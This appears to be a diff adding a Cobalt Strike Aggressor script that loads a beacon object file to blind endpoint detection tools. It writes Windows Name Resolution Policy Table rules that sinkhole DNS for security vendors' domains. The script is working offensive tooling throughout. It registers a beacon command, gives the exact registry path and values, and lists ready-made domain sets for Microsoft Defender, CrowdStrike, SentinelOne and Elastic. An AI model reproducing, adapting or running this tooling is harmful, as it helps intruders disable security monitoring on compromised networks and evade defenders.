@@ -1,0 +1,89 @@
+# nrpt_sinkhole.cna — Aggressor script for nrpt_sinkhole BOF
+#
+# Block EDR DNS resolution by injecting sinkhole rules into the Windows NRPT
+# (Name Resolution Policy Table). Matching domains are redirected to 127.0.0.2
+# where nothing is listening, causing DNS to return SERVFAIL.
+#
+# The NRPT is evaluated by the DNS Client service (dnscache) BEFORE forwarding
+# to the system resolver, so rules take effect without touching /etc/hosts or
+# the adapter DNS configuration.
+#
+# Registry path written:
+#   HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient\DnsPolicyConfig\edrchoker_XXXXXXXX\
+#     Name          REG_MULTI_SZ   "*.target.com\0\0"
+#     Version       REG_DWORD      2
+#     ConfigOptions REG_DWORD      8 (GenericDNSServer)
+#     DNSServers    REG_SZ         "127.0.0.2"
+#
+# Usage:
+#   nrpt_sinkhole *.security.microsoft.com;*.wdcp.microsoft.com   add rules
+#   nrpt_sinkhole remove                                           remove all edrchoker_ rules
+
+alias nrpt_sinkhole {
+    local('$bof $args $bid $handle $path $mode $domains');
+    $bid  = $1;
+    $path = script_resource("nrpt_sinkhole.x64.o");
+
+    $handle = openf($path);
+    if ($handle is $null) {
+        berror($bid, "[nrpt_sinkhole] Cannot open BOF: " . $path);
+        return;
+    }
+    $bof = readb($handle, 1048576);
+    closef($handle);
+    if ($bof is $null) {
+        berror($bid, "[nrpt_sinkhole] readb failed for: " . $path);
+        return;
+    }
+    println("[nrpt_sinkhole] loaded " . strlen($bof) . " bytes from " . $path);
+
+    if (size(@_) == 1) {
+        # No args — show usage
+        berror($bid, "[nrpt_sinkhole] Usage:\n" .
+            "  nrpt_sinkhole *.foo.com;*.bar.com   add sinkhole rules\n" .
+            "  nrpt_sinkhole remove                remove all edrchoker_ rules");
+        return;
+
+    } else if ($2 eq "remove") {
+        # Remove all edrchoker_ NRPT rules
+        $mode    = 1;
+        $domains = "";
+        btask($bid, "NRPT Sinkhole: removing all edrchoker_ rules");
+
+    } else {
+        # Add sinkhole rules for listed domains
+        $mode    = 0;
+        $domains = $2;
+        btask($bid, "NRPT Sinkhole: adding rules for -> " . $2);
+    }
+
+    # i = int32 (mode), Z = null-terminated wide string (domain list)
+    $args = bof_pack("iZ", $mode, $domains);
+    beacon_inline_execute($bid, $bof, "go", $args);
+}
+
+beacon_command_register(
+    "nrpt_sinkhole",
+    "Block EDR DNS resolution via NRPT sinkhole rules (redirects to 127.0.0.2)",
+    "Usage:\n" .
+    "  nrpt_sinkhole <domains>   add sinkhole rules (semicolon-separated domain patterns)\n" .
+    "  nrpt_sinkhole remove      remove all edrchoker_ NRPT rules\n\n" .
+    "Examples:\n" .
+    "  nrpt_sinkhole *.security.microsoft.com;*.wdcp.microsoft.com\n" .
+    "  nrpt_sinkhole *.cloudsink.net;*.falcon.crowdstrike.com\n" .
+    "  nrpt_sinkhole *.sentinelone.net;*.pax.sentinelone.net\n" .
+    "  nrpt_sinkhole remove\n\n" .
+    "Mechanism:\n" .
+    "  Writes NRPT rules under:\n" .
+    "    HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient\\DnsPolicyConfig\\\n" .
+    "  DNS Client service evaluates NRPT BEFORE forwarding to system resolver.\n" .
+    "  Matching queries go to 127.0.0.2 (nothing listening) -> SERVFAIL.\n" .
+    "  DNS cache is flushed immediately after rule install.\n\n" .
+    "Common EDR domains:\n" .
+    "  MDE:           *.security.microsoft.com;*.wdcp.microsoft.com;*.ods.opinsights.azure.com\n" .
+    "  CrowdStrike:   *.cloudsink.net;*.falcon.crowdstrike.com\n" .
+    "  SentinelOne:   *.sentinelone.net;*.pax.sentinelone.net\n" .
+    "  Elastic:       *.elastic.co;*.fleet.elastic.co\n\n" .
+    "Requires: Administrator (HKLM write access)\n" .
+    "Verify:   reg query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient\\DnsPolicyConfig\""
+);
